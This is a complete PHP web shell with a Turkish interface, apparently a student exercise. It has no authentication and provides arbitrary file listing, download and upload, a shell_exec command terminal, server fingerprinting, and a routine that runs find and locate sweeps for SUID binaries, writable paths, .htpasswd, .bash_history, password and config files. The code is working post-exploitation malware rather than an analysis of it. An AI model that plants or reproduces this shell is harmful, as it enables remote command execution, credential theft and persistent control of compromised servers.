<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell Uygulaması</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f5;
            margin: 0;
            padding: 20px;
            color: #333;
        }

        h1 {
            color: #4A4A8D;
            text-align: center;
            margin-bottom: 20px;
        }

        h2 {
            color: #4A4A8D;
            margin: 20px 0;
        }

        p {
            font-size: 16px;
            line-height: 1.6;
        }

        ul {
            list-style-type: none;
            padding: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
        }

        ul li {
            margin: 10px 0;
        }

        a {
            text-decoration: none;
            color: #fff;
            background-color: #4A90E2;
            padding: 10px 15px;
            border-radius: 5px;
            transition: background-color 0.3s, transform 0.3s;
            display: inline-block;
        }

        a:hover {
            background-color: #357ABD;
            transform: translateY(-2px);
        }

        .error {
            color: #fff;
            background-color: #D9534F;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            text-align: center;
        }

        input[type="file"],
        input[type="text"] {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: calc(100% - 22px);
            font-size: 16px;
        }

        button {
            padding: 10px 15px;
            background-color: #5CB85C;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }

        button:hover {
            background-color: #4CAE4C;
            transform: translateY(-2px);
        }

        .container {
            max-width: 800px;
            margin: auto;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @media (max-width: 600px) {
            ul {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>

<?php
$action = $_GET['action'] ?? null;

switch ($action) {
    case 'list':
        listFiles();
        break;
    case 'search':
        searchFiles();
        break;
    case 'upload':
        uploadFile();
        break;
    case 'download':
        downloadFile();
        break;
    case 'permissions':
        checkPermissions();
        break;
    case 'terminal':
        executeCommand();
        break;
    case 'searchConfig':
        searchConfigFiles();
        break;
    case 'serverinfo':
        serverinfoPage();
        break;
    case 'help':
        showHelp();
        break;
    default:
        showPage();
        break;
}

function showPage() {
    echo "<div class='container'>";
    echo "<h1>Yavuzlar Webshell</h1>";
    echo "<p>Yapabileceğiniz işlemler:</p>";
    echo "<ul>
            <li><a href='?action=list'>Dosyaları Listele</a></li>
            <li><a href='?action=search'>Dosya Ara</a></li>
            <li><a href='?action=upload'>Dosya Yükle</a></li>
            <li><a href='?action=permissions'>Dosyanın İzinlerini Kontrol Et</a></li>
            <li><a href='?action=searchConfig'>Config Dosyalarını Ara</a></li>
            <li><a href='?action=terminal'>Kod Yazma Terminali</a></li>
            <li><a href='?action=serverinfo'>Sunucu Bilgisi</a></li>
            <li><a href='?action=help'>Yardım</a></li>
          </ul>";
    echo "</div>";
}

function listFiles() {
    $dir = $_GET['dir'] ?? '.';
    if (is_dir($dir)) {
        $files = scandir($dir);
        echo "<div class='container'>";
        echo "<h2>$dir Dizinindeki Dosyalar:</h2>";
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                echo "$file <a href='?action=download&file=$file'>İndir</a><br>";
            }
        }
        echo "</div>";
    } else {
        echo "<div class='error'>Geçersiz dizin!</div>";
    }
    exit;
}

function searchFiles() {
    echo "<div class='container'>";
    echo "<h2>Dosya Ara</h2>";
    echo "<form method='GET' action=''>
            <input type='hidden' name='action' value='search'>
            <input type='text' name='term' placeholder='Arama terimini girin' required>
            <button type='submit'>Ara</button>
          </form>";
    if (isset($_GET['term'])) {
        $term = $_GET['term'];
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));
        $found = false;
        foreach ($files as $file) {
            if (strpos($file, $term) !== false) {
                echo "$file<br>";
                $found = true;
            }
        }
        if (!$found) {
            echo "<div class='error'>Arama terimi ile eşleşen dosya bulunamadı!</div>";
        }
    }
    echo "</div>";
    exit;
}

function uploadFile() {
    echo "<div class='container'>";
    echo "<h2>Dosya Yükle</h2>";
    echo "<form method='POST' enctype='multipart/form-data'>
            <input type='file' name='file' required>
            <button type='submit'>Yükle</button>
          </form>";
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $uploadDir = './uploads/';
        if (!is_dir($uploadDir)) {
            mkdir($uploadDir);
        }
        $uploadFile = $uploadDir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            echo "<div>Dosya başarıyla yüklendi: $uploadFile</div>";
        } else {
            echo "<div class='error'>Dosya yüklenirken bir hata oluştu!</div>";
        }
    } elseif (isset($_FILES['file'])) {
        echo "<div class='error'>Dosya seçilmedi veya yükleme hatası var!</div>";
    }
    echo "</div>";
    exit;
}

function downloadFile() {
    $file = $_GET['file'] ?? null;
    if ($file && file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "<div class='error'>Dosya bulunamadı!</div>";
    }
    exit;
}

function checkPermissions() {
    echo "<div class='container'>";
    echo "<h2>Dosya İzinlerini Kontrol Et</h2>";
    echo "<form method='GET' action=''>
            <input type='hidden' name='action' value='permissions'>
            <input type='text' name='file' placeholder='Dosya adını girin' required>
            <button type='submit'>Kontrol Et</button>
          </form>";
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        if (file_exists($file)) {
            $permissions = substr(sprintf('%o', fileperms($file)), -4);
            echo "<div>$file için izinler: $permissions</div>";
        } else {
            echo "<div class='error'>Dosya bulunamadı!</div>";
        }
    }
    echo "</div>";
    exit;
}

function executeCommand() {
    echo "<div class='container'>";
    echo "<h2>Terminal</h2>";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $command = escapeshellcmd($_POST['command']);
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    echo "<form method='POST'>
            <input type='text' name='command' placeholder='Komut girin' required>
            <button type='submit'>Çalıştır</button>
          </form>";
    echo "</div>";
    exit;
}

function serverinfoPage() {
    $serverInfo = [
        'Sistem Bilgileri' => php_uname(),
        'Sunucu Yazılımı' => $_SERVER['SERVER_SOFTWARE'],
        'Sunucu İsmi' => $_SERVER['SERVER_NAME'],
        'Sunucu Protokolü' => $_SERVER['SERVER_PROTOCOL'],
        'Belge Kök Dizini' => $_SERVER['DOCUMENT_ROOT'],
        'Güncel Zaman' => date('Y-m-d H:i:s'),
        'PHP Sürümü' => phpversion(),
        'Yüklenmiş PHP Eklentileri' => implode(', ', get_loaded_extensions()),
        'Sunucu IP' => $_SERVER['SERVER_ADDR'],
        'Client(müşteri-biz) IP' => $_SERVER['REMOTE_ADDR'],
        'HTTP User Agent(bunun türkçesi tuhaf oluyor hocam :p)' => $_SERVER['HTTP_USER_AGENT'],
    ];

    echo '<h2>Sunucu Bilgileri</h2>';
    echo '<table border="1" cellpadding="5" cellspacing="0">';
    foreach ($serverInfo as $key => $value) {
        echo '<tr>';
        echo '<td><strong>' . $key . '</strong></td>';
        echo '<td>' . $value . '</td>';
        echo '</tr>';
    }
    echo '</table>';
}

function searchConfigFiles() {
    // config dosyası bulma fonksiyonunu yazdım ancak çok sağlıklı çalışmadı. Bir arkadaşımdan yardım alarak bu fonksiyonu yazdım.

    $commands = [
        "tüm suid dosyalarını bul" => "find / -type f -perm -04000 -ls",
        "mevcut dizindeki suid dosyalarını bul" => "find . -type f -perm -04000 -ls",
        "tüm sgid dosyalarını bul" => "find / -type f -perm -02000 -ls",
        "mevcut dizindeki sgid dosyalarını bul" => "find . -type f -perm -02000 -ls",
        "config.inc.php dosyalarını bul" => "find / -type f -name config.inc.php",
        "config* dosyalarını bul" => "find / -type f -name \"config*\"",
        "mevcut dizindeki config* dosyalarını bul" => "find . -type f -name \"config*\"",
        "tüm yazılabilir klasörler ve dosyaları bul" => "find / -perm -2 -ls",
        "mevcut dizindeki yazılabilir klasörler ve dosyaları bul" => "find . -perm -2 -ls",
        "tüm service.pwd dosyalarını bul" => "find / -type f -name service.pwd",
        "mevcut dizindeki service.pwd dosyalarını bul" => "find . -type f -name service.pwd",
        "tüm .htpasswd dosyalarını bul" => "find / -type f -name .htpasswd",
        "mevcut dizindeki .htpasswd dosyalarını bul" => "find . -type f -name .htpasswd",
        "tüm .bash_history dosyalarını bul" => "find / -type f -name .bash_history",
        "mevcut dizindeki .bash_history dosyalarını bul" => "find . -type f -name .bash_history",
        "tüm .fetchmailrc dosyalarını bul" => "find / -type f -name .fetchmailrc",
        "mevcut dizindeki .fetchmailrc dosyalarını bul" => "find . -type f -name .fetchmailrc",
        "httpd.conf dosyalarını bul" => "locate httpd.conf",
        "vhosts.conf dosyalarını bul" => "locate vhosts.conf",
        "proftpd.conf dosyalarını bul" => "locate proftpd.conf",
        "psybnc.conf dosyalarını bul" => "locate psybnc.conf",
        "my.conf dosyalarını bul" => "locate my.conf",
        "admin.php dosyalarını bul" => "locate admin.php",
        "cfg.php dosyalarını bul" => "locate cfg.php",
        "conf.php dosyalarını bul" => "locate conf.php",
        "config.dat dosyalarını bul" => "locate config.dat",
        "config.php dosyalarını bul" => "locate config.php",
        "config.inc dosyalarını bul" => "locate config.inc",
        "config.default.php dosyalarını bul" => "locate config.default.php",
        ".conf dosyalarını bul" => "locate '.conf'",
        ".pwd dosyalarını bul" => "locate '.pwd'",
        ".sql dosyalarını bul" => "locate '.sql'",
        ".htpasswd dosyalarını bul" => "locate '.htpasswd'",
        ".bash_history dosyalarını bul" => "locate '.bash_history'",
        ".mysql_history dosyalarını bul" => "locate '.mysql_history'",
        ".fetchmailrc dosyalarını bul" => "locate '.fetchmailrc'",
        "yedek dosyalarını bul" => "locate backup",
        "dump dosyalarını bul" => "locate dump",
        "priv dosyalarını bul" => "locate priv"
    ];

    echo '<h2>Config Dosyası Tespiti</h2>';
    foreach ($commands as $description => $command) {
        echo '<h3>' . $description . '</h3>';
        echo '<pre>';
        echo shell_exec($command . ' 2>&1');
        echo '</pre>';
    }
}

function showHelp() {
    echo "<div class='container'>";
    echo "<h2>Yardım</h2>";
    echo "<p>Webshell uygulamanızda şu işlemleri gerçekleştirebilirsiniz:</p>";
    echo "<ul>
            <li><strong><code>list</code>:</strong> Dosyaları listelemek için bu komutu kullanın. <a href='?action=list'>Kullan</a></li>
            <li><strong><code>search</code>:</strong> Belirli dosyaları aramak için bu komutu kullanın. <a href='?action=search'>Kullan</a></li>
            <li><strong><code>upload</code>:</strong> Dosya yüklemek için bu komutu kullanın. <a href='?action=upload'>Kullan</a></li>
            <li><strong><code>download</code>:</strong> Dosyaları indirmek için bu komutu kullanın. <a href='?action=download'>Kullan</a></li>
            <li><strong><code>serverinfo</code>:</strong> Sunucu bilgisini öğrenmek için bu komutu kullanın. <a href='?action=serverinfo'>Kullan</a></li>
            <li><strong><code>permissions</code>:</strong> Dosya izinlerini kontrol etmek için bu komutu kullanın. <a href='?action=permissions'>Kullan</a></li>
            <li><strong><code>terminal</code>:</strong> Komut çalıştırmak için bu komutu kullanın. <a href='?action=terminal'>Kullan</a></li>
            <li><strong><code>searchConfig</code>:</strong> Config dosyalarını aramak için bu komutu kullanın. <a href='?action=searchConfig'>Kullan</a></li>
          </ul>";
    echo "</div>";
    exit;
}

?>
</body>
</html>
